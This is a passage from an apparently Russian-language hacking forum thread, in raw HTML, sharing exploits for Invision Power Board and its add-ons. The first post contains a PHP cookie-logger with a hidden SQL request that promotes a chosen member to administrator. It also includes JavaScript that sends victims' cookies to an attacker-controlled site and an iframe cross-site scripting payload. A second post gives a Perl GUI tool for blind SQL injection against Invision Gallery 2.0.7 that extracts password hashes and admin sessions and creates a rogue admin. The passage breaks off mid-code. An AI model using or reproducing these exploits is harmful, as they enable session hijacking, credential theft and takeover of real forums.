<br /><dl class="codebox"><dt>Код: <a href="#" onclick="selectCode(this); return false;">Выделить всё</a></dt><dd><code>&lt;?php <br />$target = &quot;http://www.yourtarget.com/forum&quot;; #Target forum without trailing slash <br />$prefix = &quot;ibf_&quot;; #Database prefix, default: ibf_ <br />$member = 22; #Member id to promote <br />$newgroup = 4; # The id of the new group to promote, normally 4 is root admin <br /><br />$ip = $_SERVER&#91;'REMOTE_ADDR'&#93;; <br />$referer = $_SERVER&#91;'HTTP_REFERER'&#93;; <br />$agent = $_SERVER&#91;'HTTP_USER_AGENT'&#93;; <br /><br />$data = $_GET&#91;'c'&#93;; <br />$time = date&#40;&quot;Y-m-d G:i:s A&quot;&#41;; <br />$text = &quot;Time: &quot;.$time.&quot;\nIP:&quot;.$ip.&quot;\nReferer:&quot;.$referer.&quot;\nUser-Agent:&quot;.$agent.&quot;\nCookie:&quot;.$data.&quot;\n\n&quot;; <br /><br />$file = fopen&#40;'log.txt' , 'a'&#41;; <br />fwrite&#40;$file,$text&#41;; <br />fclose&#40;$file&#41;; <br />if&#40;preg_match&#40;&quot;/ipb_admin_session_id=&#40;&#91;0-9a-z&#93;&#123;32&#125;&#41;;/&quot;,$data,$stuff&#41;&#41; <br />&#123; <br />print '&lt;img width=0 height=0 src=&quot;'.$target.'/admin/index.php?adsess='.$stuff&#91;1&#93;.'&amp;act=sql&amp;code=runsql&amp;section=admin&amp;query=UPDATE+ <br />'.$prefix.'members+SET <br />+mgroup+%3D+%27'.$newgroup.'%27+WHERE+id+%3D+%27'.&nbsp; $member.'%27&amp;st=&quot;&gt;&lt;/&gt;'; <br />&#125; <br />?&gt; <br /># # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # <br />#&nbsp; &nbsp; Also create a file in the same directory named &quot;log.txt&quot; and chmod it 777 <br /># <br />#&nbsp; &nbsp; Now, create a file called script.js on your webserver, put this code in it: <br /># <br /># # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # <br /><br />document.location=&quot;http://www.yourownsite.com/path/to/file/name.php?c=&quot;+document.cookie; <br /><br /># # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # <br /># <br />#&nbsp; &nbsp; And, last but not least, create a file that combines those two;&#41; <br />#&nbsp; &nbsp; Name it blah.html and put this code in it: <br /># # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # <br /><br />&lt;iframe border=0 src=&quot;http://www.targetforum.com/forum_folder/jscripts/folder_rte_files/module_table.php?editorid=//--&gt;&lt;/ <br />script&gt;&lt;script src=http://www.yourownsite.com/path/to/file/script.js&gt;&quot; width=0 height=0&gt;&lt;/iframe&gt;</code></dd></dl></div><div id="sig51069" class="signature">Спорьте, заблуждайтесь, ошибайтесь, но, ради бога, размышляйте, и хотя криво, да сами.
<br /><img src="http://megaobzor.com/load/forum/adminlich.gif" alt="Изображение" />
<br />Серьезное лицо - еще не признак ума, господа. Вы улыбайтесь, господа, улыбайтесь!</div>
</div>
<dl class="postprofile" id="profile51069"><dt><span style="font-size: 1.1em;"><a href="./memberlist.php?mode=viewprofile&amp;u=2&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a" style="color: #ff8000;" class="username-coloured">Lenar</a></span> <img src="./styles/prosilver/theme/images/icon_gender_m.gif" title="Пол: Мужской" alt="M" /></dt><dd>Местный Босс</dd><dd><img src="./images/ranks/r10.gif" alt="Местный Босс" title="Местный Босс" /></dd><dd><a href="./memberlist.php?mode=viewprofile&amp;u=2&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a"><img src="./download/file.php?avatar=2_1318920352.gif" width="100" height="100" alt="Аватара пользователя" /></a></dd><dd><strong>Откуда:</strong> Казань</dd><dd><strong>Сообщения:</strong> 11725</dd><dd><strong>Медали:</strong> 12</dd><dd><img src="./images/medals/Medal-5.gif" border="0" alt="Ораторская (11)" title="Ораторская (11)"   /><img src="./images/medals/Medal-4.gif" border="0" alt="Творец MegaObzor (1)" title="Творец MegaObzor (1)"   /></dd><dd><ul class="profile-icons"><li class="skype-icon"><a href="skype:lenarsmm?chat" title="Skype"><span>Skype</span></a></li></ul></dd>
</dl>
<div class="back2top"><a href="#wrap" class="top" title="Вернуться к началу">Вернуться к началу</a></div>
<span class="corners-bottom"><span></span></span></div></div>
<hr class="divider" /><div id="p51123" class="post bg2"><div class="inner"><span class="corners-top"><span></span></span>
<div class="postbody"><p class="author"><a href="./viewtopic.php?p=51123&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a#p51123"><img src="./styles/prosilver/imageset/icon_post_target.gif" width="11" height="9" alt="Сообщение" title="Сообщение" /></a> <strong><a href="./memberlist.php?mode=viewprofile&amp;u=895&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a" style="color: #0000a0;" class="username-coloured">divir</a></strong> &raquo; 02 мар 2008 17:38 </p>

<div class="content"><span style="font-weight: bold">Кстати не плохо было бы рассматривать не только сами движки, но популярные моды к нему</span>
<br />
<br />Я начну:
<br />
<br /><span style="font-weight: bold">Invision Gallery version &lt;= 2.0.7 sql injection exploit</span>
<br />(c) 1dt.w0lf RST/GHC
<br />
<br /><dl class="codebox"><dt>Код: <a href="#" onclick="selectCode(this); return false;">Выделить всё</a></dt><dd><code>#!/usr/bin/perl<br /><br />## Invision Gallery version &lt;= 2.0.7 sql injection exploit<br />## &#40;c&#41;oded by 1dt.w0lf<br />## RST/GHC<br /><br />##&nbsp; &nbsp; &nbsp; &nbsp; THIS IS UNPUBLISHED RST/GHC EXPLOIT CODE<br />##&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;KEEP IT PRIVATE<br /><br />use Tk;<br />use Tk::BrowseEntry;<br />use Tk::DialogBox;<br />use LWP::UserAgent;<br /><br />$mw = new MainWindow&#40;title =&gt; &quot;r57ig207&quot; &#41;;<br /><br />$mw-&gt;geometry &#40; '420x510' &#41; ;<br />$mw-&gt;resizable&#40;0,0&#41;;<br /><br />$mw-&gt;Label&#40;-text =&gt; '!', -font =&gt; '&#123;Webdings&#125; 22'&#41;-&gt;pack&#40;&#41;;<br />$mw-&gt;Label&#40;-text =&gt; 'Invision Gallery &lt;=2.0.7 sql injection exploit by RST/GHC', -font =&gt; '&#123;Verdana&#125; 7 bold',-foreground=&gt;'red'&#41;-&gt;pack&#40;&#41;;<br />$mw-&gt;Label&#40;-text =&gt; ''&#41;-&gt;pack&#40;&#41;;<br /><br />$fleft=$mw-&gt;Frame&#40;&#41;-&gt;pack &#40; -side =&gt; 'left', -anchor =&gt; 'ne'&#41; ;<br />$fright=$mw-&gt;Frame&#40;&#41;-&gt;pack &#40; -side =&gt; 'left', -anchor =&gt; 'nw'&#41; ;<br /><br />$url = 'http://server/forum/index.php';<br />$user_id = '1';<br />$prefix = 'ibf_';<br />$table = 'members';<br />$column = 'member_login_key';<br />$new_admin_name = 'rstghc';<br />$new_admin_password = 'rstghc';<br />$new_admin_email = 'billy@microsoft.com';<br />$report = '';<br />$group = 1;<br />$curr_user = 0;<br />$use_custom_fields = 0;<br />$custom_fields = 'name1=value1,name2=value2';<br /><br />$fleft-&gt;Label &#40; -text =&gt; 'Path to forum index: ', -font =&gt; '&#123;Verdana&#125; 8 bold'&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'e' &#41; ;<br />$fright-&gt;Entry &#40; -relief =&gt; &quot;groove&quot;, -width =&gt; 35, -font =&gt; '&#123;Verdana&#125; 8', -textvariable =&gt; \$url&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'w' &#41; ;<br /><br />$fleft-&gt;Label &#40; -text =&gt; 'User ID: ', -font =&gt; '&#123;Verdana&#125; 8 bold' &#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'e' &#41; ;<br />$fright-&gt;Entry &#40; -relief =&gt; &quot;groove&quot;, -width =&gt; 35, -font =&gt; '&#123;Verdana&#125; 8', -textvariable =&gt; \$user_id&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'w' &#41; ;<br /><br />$fleft-&gt;Label &#40; -text =&gt; 'Database tables prefix: ', -font =&gt; '&#123;Verdana&#125; 8 bold'&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'e' &#41; ;<br />$fright-&gt;Entry &#40; -relief =&gt; &quot;groove&quot;, -width =&gt; 35, -font =&gt; '&#123;Verdana&#125; 8', -textvariable =&gt; \$prefix&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'w' &#41; ;<br /><br />$fright-&gt;Label&#40; -text =&gt; ' '&#41;-&gt;pack&#40;&#41;;<br />$fleft-&gt;Label&#40; -text =&gt; ' '&#41;-&gt;pack&#40;&#41;;<br /><br />$fleft-&gt;Label &#40; -text =&gt; 'get data from database', -font =&gt; '&#123;Verdana&#125; 8 bold',-foreground=&gt;'green'&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'e' &#41; ;<br />$fright-&gt;Label&#40; -text =&gt; ' '&#41;-&gt;pack&#40;&#41;;<br /><br />$fleft-&gt;Label &#40; -text =&gt; 'Get data from table: ', -font =&gt; '&#123;Verdana&#125; 8 bold'&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'e' &#41; ;<br />$b2 = $fright-&gt;BrowseEntry&#40; -command =&gt; \&amp;update_columns, -relief =&gt; &quot;groove&quot;, -variable =&gt; \$table, -font =&gt; '&#123;Verdana&#125; 8'&#41;;<br />$b2-&gt;insert&#40;&quot;end&quot;, &quot;members&quot;&#41;;<br />$b2-&gt;insert&#40;&quot;end&quot;, &quot;members_converge&quot;&#41;;<br />$b2-&gt;insert&#40;&quot;end&quot;, &quot;admin_sessions&quot;&#41;;<br />$b2-&gt;insert&#40;&quot;end&quot;, &quot;validating&quot;&#41;;<br />$b2-&gt;pack&#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'w'&#41;;<br /><br />$fleft-&gt;Label &#40; -text =&gt; 'Get data from column: ', -font =&gt; '&#123;Verdana&#125; 8 bold'&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'e' &#41; ;<br />$b = $fright-&gt;BrowseEntry&#40; -relief =&gt; &quot;groove&quot;, -variable =&gt; \$column, -font =&gt; '&#123;Verdana&#125; 8'&#41;;<br />$b-&gt;insert&#40;&quot;end&quot;, &quot;member_login_key&quot;&#41;;<br />$b-&gt;insert&#40;&quot;end&quot;, &quot;name&quot;&#41;;<br />$b-&gt;insert&#40;&quot;end&quot;, &quot;ip_address&quot;&#41;;<br />$b-&gt;insert&#40;&quot;end&quot;, &quot;legacy_password&quot;&#41;;<br />$b-&gt;insert&#40;&quot;end&quot;, &quot;email&quot;&#41;;<br />$b-&gt;pack&#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'w' &#41;;<br /><br />$fleft-&gt;Label &#40; -text =&gt; 'Returned data: ', -font =&gt; '&#123;Verdana&#125; 8 bold'&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'e' &#41; ;<br />$fright-&gt;Entry &#40; -relief =&gt; &quot;groove&quot;, -width =&gt; 35, -font =&gt; '&#123;Verdana&#125; 8', -textvariable =&gt; \$report&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'w' &#41; ;<br /><br />$fleft-&gt;Label &#40; -text =&gt; 'create new admin', -font =&gt; '&#123;Verdana&#125; 8 bold',-foreground=&gt;'green'&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'e' &#41; ;<br />$fright-&gt;Label&#40; -text =&gt; ' '&#41;-&gt;pack&#40;&#41;;<br /><br />$fleft-&gt;Label &#40; -text =&gt; 'session_id: ', -font =&gt; '&#123;Verdana&#125; 8 bold'&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'e' &#41; ;<br />$fright-&gt;Entry &#40; -relief =&gt; &quot;groove&quot;, -width =&gt; 35, -font =&gt; '&#123;Verdana&#125; 8', -textvariable =&gt; \$session_id&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'w' &#41; ;<br /><br />$fleft-&gt;Label &#40; -text =&gt; 'session_ip_address: ', -font =&gt; '&#123;Verdana&#125; 8 bold'&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'e' &#41; ;<br />$fright-&gt;Entry &#40; -relief =&gt; &quot;groove&quot;, -width =&gt; 35, -font =&gt; '&#123;Verdana&#125; 8', -textvariable =&gt; \$session_ip_address&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'w' &#41; ;<br /><br />$fleft-&gt;Label &#40; -text =&gt; 'new admin name: ', -font =&gt; '&#123;Verdana&#125; 8 bold'&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'e' &#41; ;<br />$fright-&gt;Entry &#40; -relief =&gt; &quot;groove&quot;, -width =&gt; 35, -font =&gt; '&#123;Verdana&#125; 8', -textvariable =&gt; \$new_admin_name&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'w' &#41; ;<br /><br />$fleft-&gt;Label &#40; -text =&gt; 'new admin password: ', -font =&gt; '&#123;Verdana&#125; 8 bold'&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'e' &#41; ;<br />$fright-&gt;Entry &#40; -relief =&gt; &quot;groove&quot;, -width =&gt; 35, -font =&gt; '&#123;Verdana&#125; 8', -textvariable =&gt; \$new_admin_password&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'w' &#41; ;<br /><br />$fleft-&gt;Label &#40; -text =&gt; 'new_admin_email: ', -font =&gt; '&#123;Verdana&#125; 8 bold'&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'e' &#41; ;<br />$fright-&gt;Entry &#40; -relief =&gt; &quot;groove&quot;, -width =&gt; 35, -font =&gt; '&#123;Verdana&#125; 8', -textvariable =&gt; \$new_admin_email&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'w' &#41; ;<br /><br />$fleft-&gt;Label &#40; -text =&gt; ' '&#41;-&gt;pack&#40;&#41;;<br />$fright-&gt;Checkbutton&#40; -font =&gt; '&#123;Verdana&#125; 8', -text =&gt; 'Use custom profile fields', -variable =&gt; \$use_custom_fields&#41;-&gt;pack&#40;-side =&gt; &quot;top&quot; , -anchor =&gt; 'w'&#41;;<br /><br />$fleft-&gt;Label &#40; -text =&gt; 'custom fields: ', -font =&gt; '&#123;Verdana&#125; 8 bold'&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'e' &#41; ;<br />$fright-&gt;Entry &#40; -relief =&gt; &quot;groove&quot;, -width =&gt; 35, -font =&gt; '&#123;Verdana&#125; 8', -textvariable =&gt; \$custom_fields&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'w' &#41; ;<br /><br />$fright-&gt;Label&#40; -text =&gt; ' '&#41;-&gt;pack&#40;&#41;;<br /><br />$fright-&gt;Button&#40;-text&nbsp; &nbsp; =&gt; 'Test forum vulnerability',<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -relief =&gt; &quot;groove&quot;,<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -width =&gt; '30',<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -font =&gt; '&#123;Verdana&#125; 8 bold',<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -activeforeground =&gt; 'red',<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -command =&gt; \&amp;test_vuln<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&#41;-&gt;pack&#40;&#41;;<br /><br />$fright-&gt;Button&#40;-text&nbsp; &nbsp; =&gt; 'Get database tables prefix',<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -relief =&gt; &quot;groove&quot;,<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -width =&gt; '30',<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -font =&gt; '&#123;Verdana&#125; 8 bold',<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -activeforeground =&gt; 'red',<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -command =&gt; \&amp;get_prefix<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&#41;-&gt;pack&#40;&#41;;<br /><br />$fright-&gt;Button&#40;-text&nbsp; &nbsp; =&gt; 'Get data from database',<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -relief =&gt; &quot;groove&quot;,<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -width =&gt; '30',<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -font =&gt; '&#123;Verdana&#125; 8 bold',<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -activeforeground =&gt; 'red',<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -command =&gt; \&amp;get_data<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&#41;-&gt;pack&#40;&#41;;<br /><br />$fright-&gt;Button&#40;-text&nbsp; &nbsp; =&gt; 'Create new admin',<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -relief =&gt; &quot;groove&quot;,<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -width =&gt; '30',<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -font =&gt; '&#123;Verdana&#125; 8 bold',<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -activeforeground =&gt; 'red',<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -command =&gt; \&amp;create_admin<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&#41;-&gt;pack&#40;&#41;;<br /><br /><br /><br />$fleft-&gt;Label&#40; -text =&gt; ' '&#41;-&gt;pack&#40;&#41;;<br />$fleft-&gt;Label&#40; -text =&gt; '+++ PRIV8 +++', -font =&gt; '&#123;Verdana&#125; 7'&#41;-&gt;pack&#40;&#41;;<br />$fleft-&gt;Label&#40; -text =&gt; '&#40;c&#41;oded by 1dt.w0lf', -font =&gt; '&#123;Verdana&#125; 7'&#41;-&gt;pack&#40;&#41;;<br />$fleft-&gt;Label&#40; -text =&gt; 'RST/GHC', -font =&gt; '&#123;Verdana&#125; 7'&#41;-&gt;pack&#40;&#41;;<br /><br />MainLoop&#40;&#41;;<br /><br />sub update_columns&#40;&#41;<br />&nbsp;&#123;<br />&nbsp;$b-&gt;delete&#40;0,&quot;end&quot;&#41;;<br />&nbsp;if&#40;$table eq 'members'&#41;&#123;<br />&nbsp;$column = &quot;member_login_key&quot;;&nbsp; <br />&nbsp;$b-&gt;insert&#40;&quot;end&quot;, &quot;member_login_key&quot;&#41;;<br />&nbsp;$b-&gt;insert&#40;&quot;end&quot;, &quot;name&quot;&#41;;<br />&nbsp;$b-&gt;insert&#40;&quot;end&quot;, &quot;ip_address&quot;&#41;;<br />&nbsp;$b-&gt;insert&#40;&quot;end&quot;, &quot;legacy_password&quot;&#41;;<br />&nbsp;$b-&gt;insert&#40;&quot;end&quot;, &quot;email&quot;&#41;;<br />&nbsp;&#125; elsif&#40;$table eq 'members_converge'&#41;&#123;<br />&nbsp;$column = &quot;converge_pass_hash&quot;;&nbsp; <br />&nbsp;$b-&gt;insert&#40;&quot;end&quot;, &quot;converge_pass_hash&quot;&#41;;<br />&nbsp;$b-&gt;insert&#40;&quot;end&quot;, &quot;converge_pass_salt&quot;&#41;;<br />&nbsp;$b-&gt;insert&#40;&quot;end&quot;, &quot;converge_email&quot;&#41;;<br />&nbsp;&#125; elsif&#40;$table eq 'admin_sessions'&#41;&#123;<br />&nbsp;$column = &quot;session_id&quot;;&nbsp; <br />&nbsp;$b-&gt;insert&#40;&quot;end&quot;, &quot;session_id&quot;&#41;;<br />&nbsp;$b-&gt;insert&#40;&quot;end&quot;, &quot;session_ip_address&quot;&#41;;<br />&nbsp;$b-&gt;insert&#40;&quot;end&quot;, &quot;session_member_name&quot;&#41;;<br />&nbsp;$b-&gt;insert&#40;&quot;end&quot;, &quot;session_member_id&quot;&#41;;<br />&nbsp;&#125; elsif&#40;$table eq 'validating'&#41;&#123;<br />&nbsp;$column = &quot;vid&quot;;&nbsp; <br />&nbsp;$b-&gt;insert&#40;&quot;end&quot;, &quot;vid&quot;&#41;;<br />&nbsp;&#125;<br />&nbsp;&#125;<br /><br />sub get_data&#40;&#41;<br />&#123;<br />$xpl = LWP::UserAgent-&gt;new&#40; &#41; or die;<br />$InfoWindow=$mw-&gt;DialogBox&#40;-title&nbsp; &nbsp;=&gt; 'get data from database', -buttons =&gt; &#91;&quot;OK&quot;&#93;&#41;;<br />if&#40;$table eq 'members'&#41; &#123; $id_text = 'id'; &#125;<br />if&#40;$table eq 'members_converge'&#41; &#123; $id_text = 'converge_id'; &#125;<br />if&#40;$table eq 'admin_sessions'&#41; &#123; $id_text = 'session_member_id'; &#125;<br />if&#40;$table eq 'validating'&#41; &#123; $id_text = 'member_id'; &#125;<br />$i = 1;<br />$report = '';<br />while&#40;1&#41;<br />&nbsp;&#123;<br />&nbsp;$ret = get_char&#40;$i&#41;;<br />&nbsp;if&#40;$ret == 0&#41; &#123; last; &#125;<br />&nbsp;else &#123; $report .= chr&#40;$ret&#41;; $i++; $mw-&gt;update&#40;&#41;; &#125;<br />&nbsp;&#125;<br />&nbsp;if&#40;$report eq ''&#41; &#123;<br />&nbsp;$InfoWindow-&gt;add&#40;'Label', -text =&gt; 'Can\'t get data', -font =&gt; '&#123;Verdana&#125; 8 bold',-foreground=&gt;'red'&#41;-&gt;pack;<br />&nbsp;&#125; else &#123;<br />&nbsp;if&#40;$column eq 'session_id'&#41; &#123; $session_id = $report; $mw-&gt;update&#40;&#41;; &#125;<br />&nbsp;elsif&#40;$column eq 'session_ip_address'&#41; &#123; $session_ip_address = $report; $mw-&gt;update&#40;&#41;; &#125;<br />&nbsp;$InfoWindow-&gt;add&#40;'Label', -text =&gt; 'Done!', -font =&gt; '&#123;Verdana&#125; 8 bold',-foreground=&gt;'green'&#41;-&gt;pack;<br />&nbsp;&#125;&nbsp; <br />&nbsp;$InfoWindow-&gt;Show&#40;&#41;;<br />&nbsp;$InfoWindow-&gt;destroy;<br />&#125;<br /><br />sub get_char&#40;&#41;<br />&nbsp;&#123;<br />&nbsp;$res = $xpl-&gt;get&#40;$url.&quot;?automodule=gallery&amp;cmd=rate&amp;img=1&amp;rating=1&amp;album=-1 union select 1,ascii&#40;substring&#40;&quot;.$column.&quot;,&quot;.$_&#91;0&#93;.&quot;,1&#41;&#41;,1,1,1,1,1,1,1,1 FROM $prefix$table WHERE $id_text = $user_id&quot;&#41;;<br />&nbsp;if&#40;$res-&gt;as_string =~ /cmd=user&amp;user=&#40;\d*&#41;&amp;op=view_album/&#41; &#123; $rep = $1; &#125;<br />&nbsp;else &#123; $rep = 0; &#125;<br />&nbsp;return $rep;<br />&nbsp;&#125;<br />&nbsp;<br />sub create_admin&#40;&#41;<br />&nbsp;&#123;<br />&nbsp;$InfoWindow=$mw-&gt;DialogBox&#40;-title&nbsp; &nbsp;=&gt; 'create new admin', -buttons =&gt; &#91;&quot;OK&quot;&#93;&#41;;<br />&nbsp;if&#40;$session_id eq '' || $session_ip_address eq ''&#41;<br />&nbsp; &#123;<br />&nbsp; $InfoWindow-&gt;add&#40;'Label', -text =&gt; 'Error!', -font =&gt; '&#123;Verdana&#125; 8 bold',-foreground=&gt;'red'&#41;-&gt;pack;<br />&nbsp; $InfoWindow-&gt;add&#40;'Label', -text =&gt; 'You need insert admin session_id and session_ip_address', -font =&gt; '&#123;Verdana&#125; 8'&#41;-&gt;pack;<br />&nbsp; &#125;<br />&nbsp;elsif&#40;$session_ip_address !~ /\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;/&#41;<br />&nbsp; &#123;<br />&nbsp; $InfoWindow-&gt;add&#40;'Label', -text =&gt; 'Error!', -font =&gt; '&#123;Verdana&#125; 8 bold',-foreground=&gt;'red'&#41;-&gt;pack;<br />&nbsp; $InfoWindow-&gt;add&#40;'Label', -text =&gt; 'session_ip_address wrong!', -font =&gt; '&#123;Verdana&#125; 8'&#41;-&gt;pack;<br />&nbsp; &#125;<br />&nbsp;else<br />&nbsp; &#123;<br />&nbsp;$xpl = LWP::UserAgent-&gt;new&#40; &#41; or die;<br />&nbsp;&#40;$url2 = $url&#41; =~ s/index.php/admin.php/;<br />&nbsp;$cf = '';<br />&nbsp;%fields = &#40;<br />&nbsp;'code'&nbsp; &nbsp; &nbsp;=&gt; 'doadd',<br />&nbsp;'act'&nbsp; &nbsp; &nbsp; =&gt; 'mem',<br />&nbsp;'section'&nbsp; =&gt; 'content',<br />&nbsp;'name'&nbsp; &nbsp; &nbsp;=&gt; $new_admin_name,<br />&nbsp;'password' =&gt; $new_admin_password,<br />&nbsp;'email'&nbsp; &nbsp; =&gt; $new_admin_email,<br />&nbsp;'mgroup'&nbsp; &nbsp;=&gt; 4, ## default admin group , maybe need change&nbsp; &nbsp; <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&#41;;<br />&nbsp;if&#40;$use_custom_fields&#41;<br />&nbsp; &#123;<br />&nbsp; @cf = split&#40;',',$custom_fields&#41;;<br />&nbsp; foreach&#40;@cf&#41; &#123; &#40;$k,$v&#41; = split&#40;'=',$_&#41;; $fields&#123;$k&#125; = $v;&#125;<br />&nbsp; &#125;<br />&nbsp;<br />&nbsp;$res = $xpl-&gt;post&#40;$url2.&quot;?adsess=$session_id&quot;,<br />&nbsp;&#91;<br />&nbsp;%fields,<br />&nbsp;&#93;,<br />&nbsp;'USER_AGENT'=&gt;'',<br />&nbsp;'CLIENT_IP'=&gt;&quot;$session_ip_address&quot;,<br />&nbsp;'X_FORWARDED_FOR'=&gt;&quot;$session_ip_address&quot;&#41;;<br />&nbsp;$InfoWindow-&gt;add&#40;'Label', -text =&gt; 'Done!', -font =&gt; '&#123;Verdana&#125; 8 bold',-foreground=&gt;'green'&#41;-&gt;pack;<br />&nbsp;$InfoWindow-&gt;add&#40;'Label', -text =&gt; 'New admin created', -font =&gt; '&#123;Verdana&#125; 8 bold'&#41;-&gt;pack; <br />&nbsp; &#125;<br />&nbsp;$InfoWindow-&gt;Show&#40;&#41;;<br />&nbsp;$InfoWindow-&gt;destroy;<br />&nbsp;&#125;<br /><br />sub test_vuln&#40;&#41;<br />&#123;<br />$InfoWindow=$mw-&gt;DialogBox&#40;-title&nbsp; &nbsp;=&gt; 'test forum vulnerability', -buttons =&gt; &#91;&quot;OK&quot;&#93;&#41;;<br />$InfoWindow-&gt;add&#40;'Label', -text =&gt; '', -font =&gt; '&#123;Verdana&#125; 8'&#41;-&gt;pack;<br />$InfoWindow-&gt;add&#40;'Label', -text =&gt; $url, -font =&gt; '&#123;Verdana&#125; 8'&#41;-&gt;pack;<br />$InfoWindow-&gt;add&#40;'Label', -text =&gt; '', -font =&gt; '&#123;Verdana&#125; 8'&#41;-&gt;pack;<br />$xpl = LWP::UserAgent-&gt;new&#40; &#41; or die;<br />$res = $xpl-&gt;get&#40;$url.&quot;?automodule=gallery&amp;cmd=rate&amp;img=1&amp;rating=1&amp;album=-1 union select 1,11457,1,1,1,1,1,1,1,1/*&quot;&#41;;<br />if&#40;$res-&gt;is_success&#41;<br />&nbsp;&#123;<br />&nbsp;$rep = '';<br />&nbsp;if&#40;$res-&gt;as_string =~ /cmd=user&amp;user=&#40;\d*&#41;&amp;op=view_album/&#41; &#123; $rep = $1; &#125;<br />&nbsp;if&#40;$rep == 11457&#41; &#123; $InfoWindow-&gt;add&#40;'Label', -text =&gt; 'FORUM VULNERABLE', -font =&gt; '&#123;Verdana&#125; 8 bold',-foreground=&gt;'red'&#41;-&gt;pack; &#125;<br />&nbsp;else &#123; $InfoWindow-&gt;add&#40;'Label', -text =&gt; 'FORUM UNVULNERABLE', -font =&gt; '&#123;Verdana&#125; 8 bold',-foreground=&gt;'green'&#41;-&gt;pack; &#125;<br />&nbsp;&#125;<br />else<br />&nbsp;&#123;<br />&nbsp;$InfoWindow-&gt;add&#40;'Label', -text =&gt; 'Error!', -font =&gt; '&#123;Verdana&#125; 8 bold',-foreground=&gt;'red'&#41;-&gt;pack;<br />&nbsp;$InfoWindow-&gt;add&#40;'Label', -text =&gt; $res-&gt;status_line, -font =&gt; '&#123;Verdana&#125; 8'&#41;-&gt;pack;<br />&nbsp;&#125;<br />$InfoWindow-&gt;Show&#40;&#41;;<br 